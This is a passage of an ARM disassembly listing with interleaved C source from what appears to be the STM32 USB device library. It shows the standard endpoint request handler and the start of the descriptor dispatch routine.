 800b68a:	6878      	ldr	r0, [r7, #4]
 800b68c:	f000 fd21 	bl	800c0d2 <USBD_CtlError>
          break;
 800b690:	e004      	b.n	800b69c <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b692:	6839      	ldr	r1, [r7, #0]
 800b694:	6878      	ldr	r0, [r7, #4]
 800b696:	f000 fd1c 	bl	800c0d2 <USBD_CtlError>
          break;
 800b69a:	e000      	b.n	800b69e <USBD_StdItfReq+0xc2>
          break;
 800b69c:	bf00      	nop
      }
      break;
 800b69e:	e004      	b.n	800b6aa <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b6a0:	6839      	ldr	r1, [r7, #0]
 800b6a2:	6878      	ldr	r0, [r7, #4]
 800b6a4:	f000 fd15 	bl	800c0d2 <USBD_CtlError>
      break;
 800b6a8:	bf00      	nop
  }

  return ret;
 800b6aa:	7bfb      	ldrb	r3, [r7, #15]
}
 800b6ac:	4618      	mov	r0, r3
 800b6ae:	3710      	adds	r7, #16
 800b6b0:	46bd      	mov	sp, r7
 800b6b2:	bd80      	pop	{r7, pc}

0800b6b4 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b6b4:	b580      	push	{r7, lr}
 800b6b6:	b084      	sub	sp, #16
 800b6b8:	af00      	add	r7, sp, #0
 800b6ba:	6078      	str	r0, [r7, #4]
 800b6bc:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b6be:	2300      	movs	r3, #0
 800b6c0:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b6c2:	683b      	ldr	r3, [r7, #0]
 800b6c4:	889b      	ldrh	r3, [r3, #4]
 800b6c6:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b6c8:	683b      	ldr	r3, [r7, #0]
 800b6ca:	781b      	ldrb	r3, [r3, #0]
 800b6cc:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b6d0:	2b40      	cmp	r3, #64	; 0x40
 800b6d2:	d007      	beq.n	800b6e4 <USBD_StdEPReq+0x30>
 800b6d4:	2b40      	cmp	r3, #64	; 0x40
 800b6d6:	f200 817f 	bhi.w	800b9d8 <USBD_StdEPReq+0x324>
 800b6da:	2b00      	cmp	r3, #0
 800b6dc:	d02a      	beq.n	800b734 <USBD_StdEPReq+0x80>
 800b6de:	2b20      	cmp	r3, #32
 800b6e0:	f040 817a 	bne.w	800b9d8 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b6e4:	7bbb      	ldrb	r3, [r7, #14]
 800b6e6:	4619      	mov	r1, r3
 800b6e8:	6878      	ldr	r0, [r7, #4]
 800b6ea:	f7ff fe82 	bl	800b3f2 <USBD_CoreFindEP>
 800b6ee:	4603      	mov	r3, r0
 800b6f0:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b6f2:	7b7b      	ldrb	r3, [r7, #13]
 800b6f4:	2bff      	cmp	r3, #255	; 0xff
 800b6f6:	f000 8174 	beq.w	800b9e2 <USBD_StdEPReq+0x32e>
 800b6fa:	7b7b      	ldrb	r3, [r7, #13]
 800b6fc:	2b00      	cmp	r3, #0
 800b6fe:	f040 8170 	bne.w	800b9e2 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b702:	7b7a      	ldrb	r2, [r7, #13]
 800b704:	687b      	ldr	r3, [r7, #4]
 800b706:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b70a:	7b7a      	ldrb	r2, [r7, #13]
 800b70c:	687b      	ldr	r3, [r7, #4]
 800b70e:	32ae      	adds	r2, #174	; 0xae
 800b710:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b714:	689b      	ldr	r3, [r3, #8]
 800b716:	2b00      	cmp	r3, #0
 800b718:	f000 8163 	beq.w	800b9e2 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b71c:	7b7a      	ldrb	r2, [r7, #13]
 800b71e:	687b      	ldr	r3, [r7, #4]
 800b720:	32ae      	adds	r2, #174	; 0xae
 800b722:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b726:	689b      	ldr	r3, [r3, #8]
 800b728:	6839      	ldr	r1, [r7, #0]
 800b72a:	6878      	ldr	r0, [r7, #4]
 800b72c:	4798      	blx	r3
 800b72e:	4603      	mov	r3, r0
 800b730:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b732:	e156      	b.n	800b9e2 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b734:	683b      	ldr	r3, [r7, #0]
 800b736:	785b      	ldrb	r3, [r3, #1]
 800b738:	2b03      	cmp	r3, #3
 800b73a:	d008      	beq.n	800b74e <USBD_StdEPReq+0x9a>
 800b73c:	2b03      	cmp	r3, #3
 800b73e:	f300 8145 	bgt.w	800b9cc <USBD_StdEPReq+0x318>
 800b742:	2b00      	cmp	r3, #0
 800b744:	f000 809b 	beq.w	800b87e <USBD_StdEPReq+0x1ca>
 800b748:	2b01      	cmp	r3, #1
 800b74a:	d03c      	beq.n	800b7c6 <USBD_StdEPReq+0x112>
 800b74c:	e13e      	b.n	800b9cc <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b74e:	687b      	ldr	r3, [r7, #4]
 800b750:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b754:	b2db      	uxtb	r3, r3
 800b756:	2b02      	cmp	r3, #2
 800b758:	d002      	beq.n	800b760 <USBD_StdEPReq+0xac>
 800b75a:	2b03      	cmp	r3, #3
 800b75c:	d016      	beq.n	800b78c <USBD_StdEPReq+0xd8>
 800b75e:	e02c      	b.n	800b7ba <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b760:	7bbb      	ldrb	r3, [r7, #14]
 800b762:	2b00      	cmp	r3, #0
 800b764:	d00d      	beq.n	800b782 <USBD_StdEPReq+0xce>
 800b766:	7bbb      	ldrb	r3, [r7, #14]
 800b768:	2b80      	cmp	r3, #128	; 0x80
 800b76a:	d00a      	beq.n	800b782 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b76c:	7bbb      	ldrb	r3, [r7, #14]
 800b76e:	4619      	mov	r1, r3
 800b770:	6878      	ldr	r0, [r7, #4]
 800b772:	f001 fa21 	bl	800cbb8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b776:	2180      	movs	r1, #128	; 0x80
 800b778:	6878      	ldr	r0, [r7, #4]
 800b77a:	f001 fa1d 	bl	800cbb8 <USBD_LL_StallEP>
 800b77e:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b780:	e020      	b.n	800b7c4 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b782:	6839      	ldr	r1, [r7, #0]
 800b784:	6878      	ldr	r0, [r7, #4]
 800b786:	f000 fca4 	bl	800c0d2 <USBD_CtlError>
              break;
 800b78a:	e01b      	b.n	800b7c4 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b78c:	683b      	ldr	r3, [r7, #0]
 800b78e:	885b      	ldrh	r3, [r3, #2]
 800b790:	2b00      	cmp	r3, #0
 800b792:	d10e      	bne.n	800b7b2 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b794:	7bbb      	ldrb	r3, [r7, #14]
 800b796:	2b00      	cmp	r3, #0
 800b798:	d00b      	beq.n	800b7b2 <USBD_StdEPReq+0xfe>
 800b79a:	7bbb      	ldrb	r3, [r7, #14]
 800b79c:	2b80      	cmp	r3, #128	; 0x80
 800b79e:	d008      	beq.n	800b7b2 <USBD_StdEPReq+0xfe>
 800b7a0:	683b      	ldr	r3, [r7, #0]
 800b7a2:	88db      	ldrh	r3, [r3, #6]
 800b7a4:	2b00      	cmp	r3, #0
 800b7a6:	d104      	bne.n	800b7b2 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b7a8:	7bbb      	ldrb	r3, [r7, #14]
 800b7aa:	4619      	mov	r1, r3
 800b7ac:	6878      	ldr	r0, [r7, #4]
 800b7ae:	f001 fa03 	bl	800cbb8 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b7b2:	6878      	ldr	r0, [r7, #4]
 800b7b4:	f000 fd58 	bl	800c268 <USBD_CtlSendStatus>

              break;
 800b7b8:	e004      	b.n	800b7c4 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b7ba:	6839      	ldr	r1, [r7, #0]
 800b7bc:	6878      	ldr	r0, [r7, #4]
 800b7be:	f000 fc88 	bl	800c0d2 <USBD_CtlError>
              break;
 800b7c2:	bf00      	nop
          }
          break;
 800b7c4:	e107      	b.n	800b9d6 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b7c6:	687b      	ldr	r3, [r7, #4]
 800b7c8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b7cc:	b2db      	uxtb	r3, r3
 800b7ce:	2b02      	cmp	r3, #2
 800b7d0:	d002      	beq.n	800b7d8 <USBD_StdEPReq+0x124>
 800b7d2:	2b03      	cmp	r3, #3
 800b7d4:	d016      	beq.n	800b804 <USBD_StdEPReq+0x150>
 800b7d6:	e04b      	b.n	800b870 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b7d8:	7bbb      	ldrb	r3, [r7, #14]
 800b7da:	2b00      	cmp	r3, #0
 800b7dc:	d00d      	beq.n	800b7fa <USBD_StdEPReq+0x146>
 800b7de:	7bbb      	ldrb	r3, [r7, #14]
 800b7e0:	2b80      	cmp	r3, #128	; 0x80
 800b7e2:	d00a      	beq.n	800b7fa <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b7e4:	7bbb      	ldrb	r3, [r7, #14]
 800b7e6:	4619      	mov	r1, r3
 800b7e8:	6878      	ldr	r0, [r7, #4]
 800b7ea:	f001 f9e5 	bl	800cbb8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b7ee:	2180      	movs	r1, #128	; 0x80
 800b7f0:	6878      	ldr	r0, [r7, #4]
 800b7f2:	f001 f9e1 	bl	800cbb8 <USBD_LL_StallEP>
 800b7f6:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b7f8:	e040      	b.n	800b87c <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b7fa:	6839      	ldr	r1, [r7, #0]
 800b7fc:	6878      	ldr	r0, [r7, #4]
 800b7fe:	f000 fc68 	bl	800c0d2 <USBD_CtlError>
              break;
 800b802:	e03b      	b.n	800b87c <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b804:	683b      	ldr	r3, [r7, #0]
 800b806:	885b      	ldrh	r3, [r3, #2]
 800b808:	2b00      	cmp	r3, #0
 800b80a:	d136      	bne.n	800b87a <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b80c:	7bbb      	ldrb	r3, [r7, #14]
 800b80e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b812:	2b00      	cmp	r3, #0
 800b814:	d004      	beq.n	800b820 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b816:	7bbb      	ldrb	r3, [r7, #14]
 800b818:	4619      	mov	r1, r3
 800b81a:	6878      	ldr	r0, [r7, #4]
 800b81c:	f001 fa02 	bl	800cc24 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b820:	6878      	ldr	r0, [r7, #4]
 800b822:	f000 fd21 	bl	800c268 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b826:	7bbb      	ldrb	r3, [r7, #14]
 800b828:	4619      	mov	r1, r3
 800b82a:	6878      	ldr	r0, [r7, #4]
 800b82c:	f7ff fde1 	bl	800b3f2 <USBD_CoreFindEP>
 800b830:	4603      	mov	r3, r0
 800b832:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b834:	7b7b      	ldrb	r3, [r7, #13]
 800b836:	2bff      	cmp	r3, #255	; 0xff
 800b838:	d01f      	beq.n	800b87a <USBD_StdEPReq+0x1c6>
 800b83a:	7b7b      	ldrb	r3, [r7, #13]
 800b83c:	2b00      	cmp	r3, #0
 800b83e:	d11c      	bne.n	800b87a <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b840:	7b7a      	ldrb	r2, [r7, #13]
 800b842:	687b      	ldr	r3, [r7, #4]
 800b844:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b848:	7b7a      	ldrb	r2, [r7, #13]
 800b84a:	687b      	ldr	r3, [r7, #4]
 800b84c:	32ae      	adds	r2, #174	; 0xae
 800b84e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b852:	689b      	ldr	r3, [r3, #8]
 800b854:	2b00      	cmp	r3, #0
 800b856:	d010      	beq.n	800b87a <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b858:	7b7a      	ldrb	r2, [r7, #13]
 800b85a:	687b      	ldr	r3, [r7, #4]
 800b85c:	32ae      	adds	r2, #174	; 0xae
 800b85e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b862:	689b      	ldr	r3, [r3, #8]
 800b864:	6839      	ldr	r1, [r7, #0]
 800b866:	6878      	ldr	r0, [r7, #4]
 800b868:	4798      	blx	r3
 800b86a:	4603      	mov	r3, r0
 800b86c:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b86e:	e004      	b.n	800b87a <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b870:	6839      	ldr	r1, [r7, #0]
 800b872:	6878      	ldr	r0, [r7, #4]
 800b874:	f000 fc2d 	bl	800c0d2 <USBD_CtlError>
              break;
 800b878:	e000      	b.n	800b87c <USBD_StdEPReq+0x1c8>
              break;
 800b87a:	bf00      	nop
          }
          break;
 800b87c:	e0ab      	b.n	800b9d6 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b87e:	687b      	ldr	r3, [r7, #4]
 800b880:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b884:	b2db      	uxtb	r3, r3
 800b886:	2b02      	cmp	r3, #2
 800b888:	d002      	beq.n	800b890 <USBD_StdEPReq+0x1dc>
 800b88a:	2b03      	cmp	r3, #3
 800b88c:	d032      	beq.n	800b8f4 <USBD_StdEPReq+0x240>
 800b88e:	e097      	b.n	800b9c0 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b890:	7bbb      	ldrb	r3, [r7, #14]
 800b892:	2b00      	cmp	r3, #0
 800b894:	d007      	beq.n	800b8a6 <USBD_StdEPReq+0x1f2>
 800b896:	7bbb      	ldrb	r3, [r7, #14]
 800b898:	2b80      	cmp	r3, #128	; 0x80
 800b89a:	d004      	beq.n	800b8a6 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b89c:	6839      	ldr	r1, [r7, #0]
 800b89e:	6878      	ldr	r0, [r7, #4]
 800b8a0:	f000 fc17 	bl	800c0d2 <USBD_CtlError>
                break;
 800b8a4:	e091      	b.n	800b9ca <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b8a6:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b8aa:	2b00      	cmp	r3, #0
 800b8ac:	da0b      	bge.n	800b8c6 <USBD_StdEPReq+0x212>
 800b8ae:	7bbb      	ldrb	r3, [r7, #14]
 800b8b0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b8b4:	4613      	mov	r3, r2
 800b8b6:	009b      	lsls	r3, r3, #2
 800b8b8:	4413      	add	r3, r2
 800b8ba:	009b      	lsls	r3, r3, #2
 800b8bc:	3310      	adds	r3, #16
 800b8be:	687a      	ldr	r2, [r7, #4]
 800b8c0:	4413      	add	r3, r2
 800b8c2:	3304      	adds	r3, #4
 800b8c4:	e00b      	b.n	800b8de <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b8c6:	7bbb      	ldrb	r3, [r7, #14]
 800b8c8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b8cc:	4613      	mov	r3, r2
 800b8ce:	009b      	lsls	r3, r3, #2
 800b8d0:	4413      	add	r3, r2
 800b8d2:	009b      	lsls	r3, r3, #2
 800b8d4:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b8d8:	687a      	ldr	r2, [r7, #4]
 800b8da:	4413      	add	r3, r2
 800b8dc:	3304      	adds	r3, #4
 800b8de:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b8e0:	68bb      	ldr	r3, [r7, #8]
 800b8e2:	2200      	movs	r2, #0
 800b8e4:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b8e6:	68bb      	ldr	r3, [r7, #8]
 800b8e8:	2202      	movs	r2, #2
 800b8ea:	4619      	mov	r1, r3
 800b8ec:	6878      	ldr	r0, [r7, #4]
 800b8ee:	f000 fc61 	bl	800c1b4 <USBD_CtlSendData>
              break;
 800b8f2:	e06a      	b.n	800b9ca <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800b8f4:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b8f8:	2b00      	cmp	r3, #0
 800b8fa:	da11      	bge.n	800b920 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800b8fc:	7bbb      	ldrb	r3, [r7, #14]
 800b8fe:	f003 020f 	and.w	r2, r3, #15
 800b902:	6879      	ldr	r1, [r7, #4]
 800b904:	4613      	mov	r3, r2
 800b906:	009b      	lsls	r3, r3, #2
 800b908:	4413      	add	r3, r2
 800b90a:	009b      	lsls	r3, r3, #2
 800b90c:	440b      	add	r3, r1
 800b90e:	3324      	adds	r3, #36	; 0x24
 800b910:	881b      	ldrh	r3, [r3, #0]
 800b912:	2b00      	cmp	r3, #0
 800b914:	d117      	bne.n	800b946 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b916:	6839      	ldr	r1, [r7, #0]
 800b918:	6878      	ldr	r0, [r7, #4]
 800b91a:	f000 fbda 	bl	800c0d2 <USBD_CtlError>
                  break;
 800b91e:	e054      	b.n	800b9ca <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800b920:	7bbb      	ldrb	r3, [r7, #14]
 800b922:	f003 020f 	and.w	r2, r3, #15
 800b926:	6879      	ldr	r1, [r7, #4]
 800b928:	4613      	mov	r3, r2
 800b92a:	009b      	lsls	r3, r3, #2
 800b92c:	4413      	add	r3, r2
 800b92e:	009b      	lsls	r3, r3, #2
 800b930:	440b      	add	r3, r1
 800b932:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800b936:	881b      	ldrh	r3, [r3, #0]
 800b938:	2b00      	cmp	r3, #0
 800b93a:	d104      	bne.n	800b946 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b93c:	6839      	ldr	r1, [r7, #0]
 800b93e:	6878      	ldr	r0, [r7, #4]
 800b940:	f000 fbc7 	bl	800c0d2 <USBD_CtlError>
                  break;
 800b944:	e041      	b.n	800b9ca <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b946:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b94a:	2b00      	cmp	r3, #0
 800b94c:	da0b      	bge.n	800b966 <USBD_StdEPReq+0x2b2>
 800b94e:	7bbb      	ldrb	r3, [r7, #14]
 800b950:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b954:	4613      	mov	r3, r2
 800b956:	009b      	lsls	r3, r3, #2
 800b958:	4413      	add	r3, r2
 800b95a:	009b      	lsls	r3, r3, #2
 800b95c:	3310      	adds	r3, #16
 800b95e:	687a      	ldr	r2, [r7, #4]
 800b960:	4413      	add	r3, r2
 800b962:	3304      	adds	r3, #4
 800b964:	e00b      	b.n	800b97e <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b966:	7bbb      	ldrb	r3, [r7, #14]
 800b968:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b96c:	4613      	mov	r3, r2
 800b96e:	009b      	lsls	r3, r3, #2
 800b970:	4413      	add	r3, r2
 800b972:	009b      	lsls	r3, r3, #2
 800b974:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b978:	687a      	ldr	r2, [r7, #4]
 800b97a:	4413      	add	r3, r2
 800b97c:	3304      	adds	r3, #4
 800b97e:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800b980:	7bbb      	ldrb	r3, [r7, #14]
 800b982:	2b00      	cmp	r3, #0
 800b984:	d002      	beq.n	800b98c <USBD_StdEPReq+0x2d8>
 800b986:	7bbb      	ldrb	r3, [r7, #14]
 800b988:	2b80      	cmp	r3, #128	; 0x80
 800b98a:	d103      	bne.n	800b994 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800b98c:	68bb      	ldr	r3, [r7, #8]
 800b98e:	2200      	movs	r2, #0
 800b990:	601a      	str	r2, [r3, #0]
 800b992:	e00e      	b.n	800b9b2 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800b994:	7bbb      	ldrb	r3, [r7, #14]
 800b996:	4619      	mov	r1, r3
 800b998:	6878      	ldr	r0, [r7, #4]
 800b99a:	f001 f979 	bl	800cc90 <USBD_LL_IsStallEP>
 800b99e:	4603      	mov	r3, r0
 800b9a0:	2b00      	cmp	r3, #0
 800b9a2:	d003      	beq.n	800b9ac <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800b9a4:	68bb      	ldr	r3, [r7, #8]
 800b9a6:	2201      	movs	r2, #1
 800b9a8:	601a      	str	r2, [r3, #0]
 800b9aa:	e002      	b.n	800b9b2 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800b9ac:	68bb      	ldr	r3, [r7, #8]
 800b9ae:	2200      	movs	r2, #0
 800b9b0:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b9b2:	68bb      	ldr	r3, [r7, #8]
 800b9b4:	2202      	movs	r2, #2
 800b9b6:	4619      	mov	r1, r3
 800b9b8:	6878      	ldr	r0, [r7, #4]
 800b9ba:	f000 fbfb 	bl	800c1b4 <USBD_CtlSendData>
              break;
 800b9be:	e004      	b.n	800b9ca <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800b9c0:	6839      	ldr	r1, [r7, #0]
 800b9c2:	6878      	ldr	r0, [r7, #4]
 800b9c4:	f000 fb85 	bl	800c0d2 <USBD_CtlError>
              break;
 800b9c8:	bf00      	nop
          }
          break;
 800b9ca:	e004      	b.n	800b9d6 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800b9cc:	6839      	ldr	r1, [r7, #0]
 800b9ce:	6878      	ldr	r0, [r7, #4]
 800b9d0:	f000 fb7f 	bl	800c0d2 <USBD_CtlError>
          break;
 800b9d4:	bf00      	nop
      }
      break;
 800b9d6:	e005      	b.n	800b9e4 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800b9d8:	6839      	ldr	r1, [r7, #0]
 800b9da:	6878      	ldr	r0, [r7, #4]
 800b9dc:	f000 fb79 	bl	800c0d2 <USBD_CtlError>
      break;
 800b9e0:	e000      	b.n	800b9e4 <USBD_StdEPReq+0x330>
      break;
 800b9e2:	bf00      	nop
  }

  return ret;
 800b9e4:	7bfb      	ldrb	r3, [r7, #15]
}
 800b9e6:	4618      	mov	r0, r3
 800b9e8:	3710      	adds	r7, #16
 800b9ea:	46bd      	mov	sp, r7
 800b9ec:	bd80      	pop	{r7, pc}
	...

0800b9f0 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b9f0:	b580      	push	{r7, lr}
 800b9f2:	b084      	sub	sp, #16
 800b9f4:	af00      	add	r7, sp, #0
 800b9f6:	6078      	str	r0, [r7, #4]
 800b9f8:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800b9fa:	2300      	movs	r3, #0
 800b9fc:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800b9fe:	2300      	movs	r3, #0
 800ba00:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800ba02:	2300      	movs	r3, #0
 800ba04:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800ba06:	683b      	ldr	r3, [r7, #0]
 800ba08:	885b      	ldrh	r3, [r3, #2]
 800ba0a:	0a1b      	lsrs	r3, r3, #8
 800ba0c:	b29b      	uxth	r3, r3
 800ba0e:	3b01      	subs	r3, #1
 800ba10:	2b0e      	cmp	r3, #14
 800ba12:	f200 8152 	bhi.w	800bcba <USBD_GetDescriptor+0x2ca>
 800ba16:	a201      	add	r2, pc, #4	; (adr r2, 800ba1c <USBD_GetDescriptor+0x2c>)
 800ba18:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ba1c:	0800ba8d 	.word	0x0800ba8d
 800ba20:	0800baa5 	.word	0x0800baa5
 800ba24:	0800bae5 	.word	0x0800bae5
 800ba28:	0800bcbb 	.word	0x0800bcbb
 800ba2c:	0800bcbb 	.word	0x0800bcbb
 800ba30:	0800bc5b 	.word	0x0800bc5b
 800ba34:	0800bc87 	.word	0x0800bc87
 800ba38:	0800bcbb 	.word	0x0800bcbb
 800ba3c:	0800bcbb 	.word	0x0800bcbb
 800ba40:	0800bcbb 	.word	0x0800bcbb
 800ba44:	0800bcbb 	.word	0x0800bcbb
 800ba48:	0800bcbb 	.word	0x0800bcbb
 800ba4c:	0800bcbb 	.word	0x0800bcbb
 800ba50:	0800bcbb 	.word	0x0800bcbb
 800ba54:	0800ba59 	.word	0x0800ba59
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800ba58:	687b      	ldr	r3, [r7, #4]
 800ba5a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800ba5e:	69db      	ldr	r3, [r3, #28]
 800ba60:	2b00      	cmp	r3, #0
 800ba62:	d00b      	beq.n	800ba7c <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800ba64:	687b      	ldr	r3, [r7, #4]
 800ba66:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800ba6a:	69db      	ldr	r3, [r3, #28]
 800ba6c:	687a      	ldr	r2, [r7, #4]
 800ba6e:	7c12      	ldrb	r2, [r2, #16]
 800ba70:	f107 0108 	add.w	r1, r7, #8
 800ba74:	4610      	mov	r0, r2
 800ba76:	4798      	blx	r3
 800ba78:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800ba7a:	e126      	b.n	800bcca <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800ba7c:	6839      	ldr	r1, [r7, #0]
 800ba7e:	6878      	ldr	r0, [r7, #4]
